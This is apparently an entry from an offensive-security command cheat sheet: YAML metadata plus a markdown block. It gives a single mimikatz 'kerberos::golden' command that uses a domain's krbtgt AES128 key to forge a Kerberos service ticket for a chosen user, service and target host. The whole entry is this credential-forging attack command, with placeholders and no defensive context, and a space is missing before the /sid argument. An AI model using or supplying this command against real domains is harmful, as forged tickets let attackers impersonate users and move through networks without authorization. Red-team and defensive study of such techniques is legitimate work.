---
id: 2de1b967-5686-4171-ab5a-9280a38530e8
name: mimikatz generate the TGS with AES 128 key
type: command
executor: bash
data: 'kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key>
  /user:<user_name> /service:<service_name> /target:<service_machine_hostname>

  '
output: null
created_at: '2020-07-14T18:14:44.042930+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# mimikatz generate the TGS with AES 128 key

```bash
kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>

```
